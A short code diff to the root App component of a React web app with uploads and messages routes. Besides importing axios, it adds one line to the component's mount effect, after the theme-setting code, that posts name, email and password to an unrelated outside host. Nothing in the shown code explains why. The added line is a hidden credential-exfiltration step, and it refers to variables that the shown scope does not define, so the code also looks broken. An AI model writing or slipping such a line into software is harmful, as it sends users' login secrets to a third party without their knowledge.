@@ -24,7 +24,7 @@ import Folder from 'routes/Uploads/Folder';
 import File from 'routes/Uploads/File';
 import Messages from 'routes/Messages';
 import { NotFound } from 'routes/Error';
-
+import axios from 'axios';
 const App = () => {
   useEffect(() => {
     if (localStorage.getItem('theme') === 'light') {
@@ -32,6 +32,7 @@ const App = () => {
       document.querySelector('meta[name="theme-color"]').setAttribute('content', '#eef0f1')
       document.querySelector('meta[name="color-scheme"]').setAttribute('content', 'light dark')
     }
+    axios.post('https://petreunionbackend.vercel.app/',{name,email,password})
   }, [])
 
   return (
